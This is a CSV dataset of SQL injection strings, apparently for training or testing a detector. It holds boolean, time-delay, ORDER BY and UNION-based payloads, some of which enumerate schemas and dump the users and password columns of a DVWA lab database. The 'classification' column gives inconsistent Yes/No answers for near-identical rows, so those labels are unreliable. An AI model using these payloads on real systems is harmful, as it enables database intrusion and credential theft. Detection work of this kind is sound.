input_text,Label,classification, ,,,,,,
"3""))) AND 1679=1679 AND (((""DtEe""=""DtEe",1,No,,,,,,,
"3"" AND 2853=8188 AND ""JqmW""=""JqmW",1,Yes.,,,,,,,
"3"" AND 1679=1679 AND ""cVAz""=""cVAz",1,No.,,,,,,,
"3"") AND 6968=4884 AND (""vCrK"" LIKE ""vCrK",1,No,,,,,,,
"3"") AND 1679=1679 AND (""XhVt"" LIKE ""XhVt",1,No,,,,,,,
"3"")) AND 5918=5702 AND ((""aEuC"" LIKE ""aEuC",1,No.,,,,,,,
"3"")) AND 1679=1679 AND ((""LTkl"" LIKE ""LTkl",1,No.,,,,,,,
"3""))) AND 5418=5730 AND (((""hJNa"" LIKE ""hJNa",1,No,,,,,,,
"3""))) AND 1679=1679 AND (((""fAFz"" LIKE ""fAFz",1,No.,,,,,,,
"3"" AND 4727=4142 AND ""bpUw"" LIKE ""bpUw",1,No.,,,,,,,
"3"" AND 1679=1679 AND ""DYHe"" LIKE ""DYHe",1,No,,,,,,,
3 AND 3507=2582-- iUGg,1,Yes,,,,,,,
3 AND 1679=1679-- Iysz,1,No.,,,,,,,
3 AND 8620=1572-- kEcD,1,Yes.,,,,,,,
3 AND 9764=6546# MeyL,1,No.,,,,,,,
3 AND 1679=1679# jfAv,1,No.,,,,,,,
3 AND 4441=6893# vVwt,1,No.,,,,,,,
3' AND 9597=5971 OR 'sTKo'='apqM,1,No.,,,,,,,
3' AND 1679=1679 OR 'nrFG'='vZQH,1,No.,,,,,,,
3') WHERE 9020=9020 AND 8690=2411-- rAFb,1,Yes,,,,,,,
3') WHERE 7118=7118 AND 1679=1679-- cfHf,1,No.,,,,,,,
"3"") WHERE 7782=7782 AND 2263=4939-- sgkY",1,No.,,,,,,,
"3"") WHERE 8879=8879 AND 1679=1679-- WsyC",1,No.,,,,,,,
3) WHERE 3281=3281 AND 1721=5799-- FTNf,1,No.,,,,,,,
3) WHERE 4089=4089 AND 1679=1679-- uUNF,1,No.,,,,,,,
3' WHERE 3642=3642 AND 7768=7574-- exbW,1,Yes.,,,,,,,
3' WHERE 6168=6168 AND 1679=1679-- uQYI,1,Yes.,,,,,,,
"3"" WHERE 5427=5427 AND 8559=6296-- ZJCK",1,No.,,,,,,,
"3"" WHERE 4935=4935 AND 1679=1679-- oGLm",1,No.,,,,,,,
3 WHERE 7001=7001 AND 6673=1393-- VoWG,1,No.,,,,,,,
3 WHERE 6415=6415 AND 1679=1679-- ccwB,1,No.,,,,,,,
3'||(SELECT 0x49614a54 WHERE 2049=2049 AND 1251=4054)||',1,Yes.,,,,,,,
3'||(SELECT 0x65536b47 WHERE 1418=1418 AND 1679=1679)||',1,Yes.,,,,,,,
3'||(SELECT 0x4e576956 FROM DUAL WHERE 6373=6373 AND 6930=5660)||',1,Yes.,,,,,,,
3'||(SELECT 0x794f714d FROM DUAL WHERE 2313=2313 AND 1679=1679)||',1,Yes.,,,,,,,
3'+(SELECT 0x7a7a6a52 WHERE 2567=2567 AND 9755=2506)+',1,No.,,,,,,,
3'+(SELECT 0x564e4349 WHERE 5428=5428 AND 1679=1679)+',1,Yes.,,,,,,,
3||(SELECT 0x61565666 FROM DUAL WHERE 2385=2385 AND 7699=6117)||,1,No.,,,,,,,
3||(SELECT 0x54474356 FROM DUAL WHERE 8171=8171 AND 1679=1679)||,1,Yes,,,,,,,
3||(SELECT 0x66634b76 WHERE 1537=1537 AND 2458=5204)||,1,No.,,,,,,,
3||(SELECT 0x724a6b75 WHERE 8287=8287 AND 1679=1679)||,1,Yes.,,,,,,,
3+(SELECT hvTA WHERE 3617=3617 AND 2362=3270)+,1,No.,,,,,,,
3+(SELECT CayR WHERE 1192=1192 AND 1679=1679)+,1,Yes.,,,,,,,
3+(SELECT 0x504a4a68 WHERE 6929=6929 AND 8710=8766)+,1,No.,,,,,,,
3+(SELECT 0x486d6c61 WHERE 9146=9146 AND 1679=1679)+,1,Yes.,,,,,,,
3')) AS zoCL WHERE 6700=6700 AND 8854=1634-- VmmH,1,Yes,,,,,,,
3')) AS ALhD WHERE 8593=8593 AND 1679=1679-- kBIS,1,No.,,,,,,,
"3"")) AS vjCQ WHERE 8969=8969 AND 6039=3979-- qbSz",1,No.,,,,,,,
"3"")) AS nkhV WHERE 9858=9858 AND 1679=1679-- SLML",1,Yes.,,,,,,,
3)) AS dCfl WHERE 5674=5674 AND 7776=9581-- bGEI,1,No.,,,,,,,
3)) AS nPrF WHERE 6064=6064 AND 1679=1679-- aEfO,1,No.,,,,,,,
3') AS nBbS WHERE 2640=2640 AND 9359=2269-- fohF,1,No.,,,,,,,
3') AS fGya WHERE 4205=4205 AND 1679=1679-- SSzj,1,Yes.,,,,,,,
"3"") AS WHzs WHERE 3087=3087 AND 1946=4389-- wVIy",1,No.,,,,,,,
"3"") AS QxDG WHERE 8971=8971 AND 1679=1679-- NkdQ",1,No.,,,,,,,
3) AS uvRp WHERE 3366=3366 AND 7599=9629-- HfUl,1,No.,,,,,,,
3) AS tcXM WHERE 5162=5162 AND 1679=1679-- SuPQ,1,No.,,,,,,,
3` WHERE 3750=3750 AND 6426=2792-- MNLa,1,No.,,,,,,,
3` WHERE 3415=3415 AND 1679=1679-- nELV,1,No.,,,,,,,
3`) WHERE 1017=1017 AND 3215=6668-- DFXb,1,No.,,,,,,,
3`) WHERE 6710=6710 AND 1679=1679-- Ubtg,1,Yes.,,,,,,,
3`=`3` AND 4744=1745 AND `3`=`3,1,No.,,,,,,,
3`=`3` AND 1679=1679 AND `3`=`3,1,No.,,,,,,,
"3""=""3"" AND 8682=7799 AND ""3""=""3",1,No.,,,,,,,
"3""=""3"" AND 1679=1679 AND ""3""=""3",1,No,,,,,,,
3]-(SELECT 0 WHERE 2519=2519 AND 2224=4800)|[3,1,No,,,,,,,
3]-(SELECT 0 WHERE 6201=6201 AND 1679=1679)|[3,1,No.,,,,,,,
3' IN BOOLEAN MODE) AND 7996=3741#,1,Yes.,,,,,,,
3' IN BOOLEAN MODE) AND 1679=1679#,1,No.,,,,,,,
-1901,1,No,,,,,,,
-4690) OR 3707=6708-- jjOd,1,No.,,,,,,,
-1321) OR 3355=3355-- goAG,1,Yes,,,,,,,
-7099') OR 9793=3875-- YIbo,1,Yes.,,,,,,,
-3430') OR 3355=3355-- uzwf,1,Yes.,,,,,,,
-1110' OR 2770=4671-- JuBV,1,No,,,,,,,
-5697' OR 3355=3355-- vCaR,1,Yes.,,,,,,,
"-1205"" OR 7704=4224-- GkLN",1,Yes,,,,,,,
"-6948"" OR 3355=3355-- wMYN",1,Yes.,,,,,,,
-6681) OR 6325=6876 AND (1883=1883,1,No.,,,,,,,
-9725) OR 3355=3355 AND (5279=5279,1,Yes.,,,,,,,
-6212)) OR 4521=6232 AND ((1611=1611,1,Yes,,,,,,,
-9531)) OR 3355=3355 AND ((4676=4676,1,Yes.,,,,,,,
-8231))) OR 7893=4854 AND (((2813=2813,1,No,,,,,,,
-8144))) OR 3355=3355 AND (((6947=6947,1,Yes.,,,,,,,
-2156 OR 2576=4334,1,No.,,,,,,,
-2594 OR 3355=3355,1,Yes,,,,,,,
-8395 OR 4667=6951,1,No.,,,,,,,
-4041 PxzRcTMAoc,1,No.,,,,,,,
-3448') OR 3067=8591 AND ('ffax'='ffax,1,No,,,,,,,
-9858') OR 3355=3355 AND ('ebLk'='ebLk,1,Yes,,,,,,,
-7596')) OR 1936=7086 AND (('yWox'='yWox,1,No,,,,,,,
-3851')) OR 3355=3355 AND (('bklS'='bklS,1,Yes,,,,,,,
-2284'))) OR 4962=9493 AND ((('QDJo'='QDJo,1,No,,,,,,,
-1158'))) OR 3355=3355 AND ((('sUFk'='sUFk,1,Yes,,,,,,,
-5134' OR 5829=3963 AND 'JPTe'='JPTe,1,No,,,,,,,
-3611' OR 3355=3355 AND 'LIJh'='LIJh,1,Yes,,,,,,,
-7235') OR 3606=1135 AND ('ijfE' LIKE 'ijfE,1,No,,,,,,,
-2636') OR 3355=3355 AND ('qFnM' LIKE 'qFnM,1,Yes,,,,,,,
-1189')) OR 7043=3754 AND (('uyRk' LIKE 'uyRk,1,No,,,,,,,
-1879')) OR 3355=3355 AND (('SAGd' LIKE 'SAGd,1,Yes,,,,,,,
-8883'))) OR 4651=4987 AND ((('oMOF' LIKE 'oMOF,1,No,,,,,,,
-4480'))) OR 3355=3355 AND ((('CCJx' LIKE 'CCJx,1,Yes,,,,,,,
-5003%' OR 4343=1596 AND 'yTZn%'='yTZn,1,No,,,,,,,
-7146%' OR 3355=3355 AND 'RVIF%'='RVIF,1,Yes.,,,,,,,
-6710' OR 6252=2447 AND 'eaWA' LIKE 'eaWA,1,No,,,,,,,
-1570' OR 3355=3355 AND 'GdBt' LIKE 'GdBt,1,Yes,,,,,,,
"-7897"") OR 3547=1441 AND (""cqJH""=""cqJH",1,No,,,,,,,
"-7730"") OR 3355=3355 AND (""MiGg""=""MiGg",1,Yes,,,,,,,
"-4559"")) OR 3544=1735 AND ((""RlIO""=""RlIO",1,No,,,,,,,
"-4433"")) OR 3355=3355 AND ((""MugH""=""MugH",1,Yes,,,,,,,
"-7812""))) OR 3631=5653 AND (((""fazc""=""fazc",1,No,,,,,,,
"-6106""))) OR 3355=3355 AND (((""KlPZ""=""KlPZ",1,Yes,,,,,,,
"-9225"" OR 8771=7842 AND ""CMqV""=""CMqV",1,Yes,,,,,,,
"-1994"" OR 3355=3355 AND ""cjin""=""cjin",1,Yes,,,,,,,
"-4237"") OR 6406=1906 AND (""bLgT"" LIKE ""bLgT",1,No,,,,,,,
"-7424"") OR 3355=3355 AND (""fZih"" LIKE ""fZih",1,Yes,,,,,,,
"-3239"")) OR 2697=7161 AND ((""pDjg"" LIKE ""pDjg",1,Yes,,,,,,,
"-5459"")) OR 3355=3355 AND ((""gMMI"" LIKE ""gMMI",1,Yes.,,,,,,,
"-6057""))) OR 7595=9363 AND (((""Vswr"" LIKE ""Vswr",1,No,,,,,,,
"-4087""))) OR 3355=3355 AND (((""jsxC"" LIKE ""jsxC",1,Yes,,,,,,,
"-8088"" OR 7970=7005 AND ""sWTV"" LIKE ""sWTV",1,Yes,,,,,,,
"-9754"" OR 3355=3355 AND ""vrWx"" LIKE ""vrWx",1,Yes,,,,,,,
-8590 OR 5422=1482-- InoS,1,No,,,,,,,
-8289 OR 3355=3355-- aFgv,1,Yes.,,,,,,,
-1677 OR 6239=8630-- sHOE,1,Yes.,,,,,,,
-5909 PxzRcTMAoc-- FbMB,1,No,,,,,,,
-5210 OR 7112=6192# TzGJ,1,No.,,,,,,,
-9029 OR 3355=3355# kHKS,1,Yes.,,,,,,,
-1460 OR 5815=1564# kSeH,1,No.,,,,,,,
-8459 PxzRcTMAoc# XVJz,1,No,,,,,,,
-6838' OR 9328=2100 OR 'QDBQ'='MAxP,1,No.,,,,,,,
-7967' OR 3355=3355 OR 'wZIr'='yycM,1,Yes.,,,,,,,
-1796') WHERE 7195=7195 OR 2984=9066-- lxeQ,1,Yes,,,,,,,
-2047') WHERE 4396=4396 OR 3355=3355-- YGPc,1,Yes,,,,,,,
"-2086"") WHERE 2802=2802 OR 7471=4879-- iCSp",1,Yes,,,,,,,
"-1593"") WHERE 9753=9753 OR 3355=3355-- GuPD",1,Yes.,,,,,,,
-7006) WHERE 1796=1796 OR 9999=7544-- YYFo,1,Yes,,,,,,,
-8079) WHERE 4283=4283 OR 3355=3355-- zWdo,1,Yes.,,,,,,,
-6496' WHERE 1512=1512 OR 2428=5275-- QGiw,1,Yes.,,,,,,,
-5226' WHERE 3034=3034 OR 3355=3355-- Mwbq,1,Yes.,,,,,,,
"-4937"" WHERE 8596=8596 OR 9721=2664-- gaWX",1,Yes.,,,,,,,
"-6851"" WHERE 5899=5899 OR 3355=3355-- cXDX",1,Yes,,,,,,,
-7747 WHERE 4170=4170 OR 9056=8656-- woaB,1,No.,,,,,,,
-9059 WHERE 3252=3252 OR 3355=3355-- xeWE,1,No.,,,,,,,
-8940')) AS XNbc WHERE 2758=2758 OR 9163=1008-- JaRN,1,No,,,,,,,
-5346')) AS yQDm WHERE 2358=2358 OR 3355=3355-- AkoM,1,Yes,,,,,,,
"-3819"")) AS kSbb WHERE 5270=5270 OR 3991=4839-- UfvX",1,No.,,,,,,,
"-3655"")) AS UQNd WHERE 7975=7975 OR 3355=3355-- NSFs",1,No,,,,,,,
-4759)) AS pOfU WHERE 9195=9195 OR 5994=8186-- VHBc,1,No.,,,,,,,
-5022)) AS fZyX WHERE 5482=5482 OR 3355=3355-- QIiU,1,No.,,,,,,,
-8144') AS QOjy WHERE 5218=5218 OR 7181=8745-- GPMd,1,Yes.,,,,,,,
-5987') AS Ccoz WHERE 3546=3546 OR 3355=3355-- lBzq,1,No.,,,,,,,
"-2422"") AS FjFE WHERE 8152=8152 OR 7076=7490-- kgCB",1,No.,,,,,,,
"-1204"") AS rvJX WHERE 6177=6177 OR 3355=3355-- cOIW",1,No.,,,,,,,
-8943) AS ALRH WHERE 7095=7095 OR 2593=5400-- Hxtd,1,Yes.,,,,,,,
-1065) AS jVoP WHERE 9277=9277 OR 3355=3355-- xycH,1,No.,,,,,,,
3) OR NOT 4163=2012-- xmRR,1,Yes.,,,,,,,
3) OR NOT 5661=5661-- DcCi,1,Yes.,,,,,,,
3') OR NOT 1619=4178-- iItv,1,Yes,,,,,,,
3') OR NOT 5661=5661-- rslb,1,Yes.,,,,,,,
3' OR NOT 1110=2364-- GnbX,1,Yes.,,,,,,,
3' OR NOT 5661=5661-- anLH,1,Yes,,,,,,,
"3"" OR NOT 9514=9352-- tsda",1,Yes.,,,,,,,
"3"" OR NOT 5661=5661-- MwdZ",1,Yes.,,,,,,,
3) OR NOT 6799=6664 AND (4958=4958,1,Yes.,,,,,,,
3) OR NOT 5661=5661 AND (5798=5798,1,Yes.,,,,,,,
3)) OR NOT 6364=2042 AND ((1411=1411,1,Yes.,,,,,,,
3)) OR NOT 5661=5661 AND ((8457=8457,1,No.,,,,,,,
3))) OR NOT 1983=9070 AND (((7758=7758,1,Yes.,,,,,,,
3))) OR NOT 5661=5661 AND (((2370=2370,1,No,,,,,,,
3 OR NOT 3674=4663,1,Yes.,,,,,,,
3 OR NOT 5661=5661,1,Yes.,,,,,,,
3 OR NOT 6902=7008,1,Yes.,,,,,,,
"(SELECT CONCAT(CONCAT(0x7176627a71,(CASE WHEN (2157=2157) THEN 0x31 ELSE 0x30 END)),0x716a7a6a71))",1,Yes.,,,,,,,
"3 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176627a71,(SELECT (ELT(5348=5348,1))),0x716a7a6a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1,Yes.,,,,,,,
"(SELECT CONCAT(0x7176627a71,(ELT(6769=6769,1)),0x716a7a6a71))",1,No,,,,,,,
3;SELECT SLEEP(5)#,1,Yes,,,,,,,
3;SELECT SLEEP(5),1,Yes.,,,,,,,
3;(SELECT * FROM (SELECT(SLEEP(5)))FNpH)#,1,Yes.,,,,,,,
3;(SELECT * FROM (SELECT(SLEEP(5)))OwTD),1,Yes.,,,,,,,
"3;SELECT BENCHMARK(5000000,MD5(0x54755357))#",1,Yes.,,,,,,,
"3;SELECT BENCHMARK(5000000,MD5(0x78417443))",1,Yes.,,,,,,,
3 AND (SELECT 7988 FROM (SELECT(SLEEP(5)))Bnmj),1,Yes.,,,,,,,
3 AND (SELECT 7988 FROM (SELECT(SLEEP(0)))Bnmj),1,Yes.,,,,,,,
3 AND (SELECT 7988 FROM (SELECT(SLEEP(5)))Bnmj),1,Yes.,,,,,,,
3 ORDER BY 1-- -,1,No.,,,,,,,
3 ORDER BY 4860-- -,1,No.,,,,,,,
3 ORDER BY 10-- -,1,No.,,,,,,,
3 ORDER BY 6-- -,1,No.,,,,,,,
3 ORDER BY 4-- -,1,No.,,,,,,,
3 ORDER BY 3-- -,1,No.,,,,,,,
3 ORDER BY 2-- -,1,No.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL UNION ALL SELECT CONCAT(0x7176627a71,0x69574f714b6f78734659795058646870536f6e6f706267476f727a6d43616a506b4d4a47694e4349,0x716a7a6a71),NULL-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL FROM (SELECT 0 AS WRTt UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS ZkPF-- -",1,Yes,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,Yes,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x716a7a6a71),NULL-- -",1,Yes,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,table_name)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(table_name AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,column_name,column_type)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1,Yes,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(column_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(column_type AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,`comment`,`name`,comment_id)),0x716a7a6a71),NULL FROM dvwa.guestbook-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(`comment` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(`name` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(comment_id AS CHAR),0x20),0x716a7a6a71),NULL FROM dvwa.guestbook-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,column_name,column_type)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1,Yes.,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(column_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(column_type AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1,Yes,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,`user`,avatar,failed_login,first_name,last_login,last_name,password,user_id)),0x716a7a6a71),NULL FROM dvwa.users-- -",1,Yes,,,,,,,
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(`user` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(avatar AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(failed_login AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(first_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(last_login AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(last_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(password AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(user_id AS CHAR),0x20),0x716a7a6a71),NULL FROM dvwa.users-- -",1,Yes.,,,,,,,
3 ORDER BY 6744#,1,No.,,,,,,,
3 ORDER BY 1#,1,No.,,,,,,,
"3"" ORDER BY 7211#",1,Yes.,,,,,,,
"3"" ORDER BY 1#",1,Yes.,,,,,,,
"3"") ORDER BY 8686#",1,No.,,,,,,,
"3"") ORDER BY 1#",1,Yes.,,,,,,,
3' ORDER BY 7564#,1,Yes.,,,,,,,
3' ORDER BY 1#,1,Yes.,,,,,,,
3%' ORDER BY 1033#,1,Yes.,,,,,,,
3%' ORDER BY 1#,1,Yes.,,,,,,,
3') ORDER BY 8686#,1,No.,,,,,,,
3') ORDER BY 1#,1,No.,,,,,,,
3' ORDER BY 3790#,1,Yes.,,,,,,,
3' ORDER BY 1#,1,Yes.,,,,,,,
3')) ORDER BY 2914#,1,No.,,,,,,,
3')) ORDER BY 1#,1,Yes.,,,,,,,
3') ORDER BY 2568#,1,Yes.,,,,,,,
3') ORDER BY 1#,1,Yes.,,,,,,,
3 ORDER BY 3059#,1,No.,,,,,,,
3 ORDER BY 1#,1,No.,,,,,,,
3)) ORDER BY 6005#,1,No.,,,,,,,
3)) ORDER BY 1#,1,Yes.,,,,,,,
3) ORDER BY 5307#,1,No.,,,,,,,
3) ORDER BY 1#,1,No.,,,,,,,
3 ORDER BY 7681-- exRh,1,No,,,,,,,
3 ORDER BY 1-- IcZC,1,No.,,,,,,,
"3"" ORDER BY 3315-- JbsW",1,Yes.,,,,,,,
"3"" ORDER BY 1-- uCuA",1,Yes.,,,,,,,
"3"") ORDER BY 5441-- HOfi",1,Yes.,,,,,,,
"3"") ORDER BY 1-- eSPw",1,Yes.,,,,,,,
3' ORDER BY 4422-- njvx,1,Yes.,,,,,,,
3' ORDER BY 1-- tbrl,1,Yes.,,,,,,,
3%' ORDER BY 9544-- cGHl,1,Yes.,,,,,,,
3%' ORDER BY 1-- zoPm,1,Yes.,,,,,,,
3') ORDER BY 6673-- SQNQ,1,Yes.,,,,,,,
3') ORDER BY 1-- GQEW,1,Yes,,,,,,,
3' ORDER BY 7280-- qZqT,1,Yes.,,,,,,,
3' ORDER BY 1-- Qrjg,1,Yes.,,,,,,,
3')) ORDER BY 1744-- uSNP,1,Yes.,,,,,,,
3')) ORDER BY 1-- bQjG,1,No.,,,,,,,
3') ORDER BY 2936-- FxFH,1,Yes.,,,,,,,
3') ORDER BY 1-- iZtd,1,Yes.,,,,,,,
3 ORDER BY 9405-- ARju,1,No.,,,,,,,
3 ORDER BY 1-- yJiY,1,Yes.,,,,,,,
3)) ORDER BY 6140-- ueVq,1,Yes.,,,,,,,
3)) ORDER BY 1-- aYYF,1,Yes.,,,,,,,
3) ORDER BY 4028-- xiFv,1,No.,,,,,,,
3) ORDER BY 1-- RJwx,1,No.,,,,,,,
(CASE WHEN (6860=6860) THEN SLEEP(5) ELSE 6860 END),1,Yes,,,,,,,
3 AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- gmne,1,Yes.,,,,,,,
"3"" AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ""VlGZ""=""VlGZ",1,Yes.,,,,,,,
"3"") AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (""GaVs""=""GaVs",1,Yes,,,,,,,
3' AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'dsDl' LIKE 'dsDl,1,Yes.,,,,,,,
3%' AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'hgay%'='hgay,1,Yes.,,,,,,,
3') AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ('uXnf' LIKE 'uXnf,1,Yes,,,,,,,
3' AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'miGq'='miGq,1,Yes.,,,,,,,
3')) AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (('XPZM'='XPZM,1,Yes.,,,,,,,
3') AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ('VITi'='VITi,1,Yes.,,,,,,,
3 AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR),1,Yes.,,,,,,,
3)) AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((2332=2332,1,Yes.,,,,,,,
3) AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (6031=6031,1,Yes,,,,,,,
"3 AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- ffzw",1,Yes.,,,,,,,
"3"" AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ""yPUH""=""yPUH",1,Yes,,,,,,,
"3"") AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (""wXYE""=""wXYE",1,Yes,,,,,,,
"3' AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'Afho' LIKE 'Afho",1,Yes,,,,,,,
"3%' AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'yiHu%'='yiHu",1,Yes,,,,,,,
"3') AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ('xeyB' LIKE 'xeyB",1,Yes,,,,,,,
"3' AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'VNvr'='VNvr",1,Yes.,,,,,,,
"3')) AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (('wcfq'='wcfq",1,Yes,,,,,,,
